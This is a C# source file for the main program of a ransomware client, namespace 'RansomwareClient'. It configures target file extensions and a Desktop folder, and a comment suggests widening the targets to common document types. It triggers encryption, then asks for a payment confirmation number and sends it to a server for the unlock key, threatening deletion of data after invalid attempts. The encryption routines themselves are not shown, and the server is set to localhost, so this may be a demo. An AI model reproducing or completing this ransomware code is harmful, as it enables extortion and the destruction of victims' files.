using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace RansomwareClient
{
    //Reference https://github.com/icsharpcode/SharpZipLib/wiki/Zip-Samples#create-a-zip-with-full-control-over-contents
    class App
    {
        //global configuration
        public static readonly List<string> TARGET_FILE_EXTENSIONS =  new List<string>() { "hack", "png" }; //change to png, docx, doc, xlsx, ppt, pptx, etc;
        public static readonly string TARGET_DRIVE = $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\Desktop\\";     
        public static readonly string TARGET_FOLDER = $"{TARGET_DRIVE}ransom"; //change to /Users/
        public static readonly string SERVER_ENDPOINT = "http://localhost:58271/";
        public static readonly string PRECRYPT_FILE_PATH = $"{TARGET_DRIVE}unencrypted.tar.gz";
        public static readonly string POSTCRYPT_FILE_PATH = $"{TARGET_DRIVE}RANSOM.pwned";
        public static readonly bool IS_DEBUG = false;
        static void Main(string[] args)
        {
            if (!File.Exists(POSTCRYPT_FILE_PATH)) Ransom.Encrypt();
            else
            {
                Console.WriteLine("Enter the payment confirmation number:");
                var payment_confirmation = Console.ReadLine();

                var unlock_key = Utility.RequestFromServer($"ransom/paid/{Utility.GetRegistryValue("Id")}", Encoding.UTF8.GetBytes(payment_confirmation));
                switch (unlock_key)
                {
                    case "ALERT":
                        Console.WriteLine("WARNING: Invalid characters detected - further invalid attempts will result in deletion of data");
                        break;
                    case "TERM":
                        //delete data
                        break;
                    case "TIME":
                        //too many tries warning
                        break;
                    case "":
                        Console.WriteLine("WARNING: Promptly provide *valid* payment confirmation - further invalid attempts will result in deletion of data");
                        break;
                    default:
                        Utility.SetRegistryKeyValuePair("AESPrivateKey", unlock_key);
                        Ransom.Decrypt();
                        break;


                }
            }
        }
    }
}
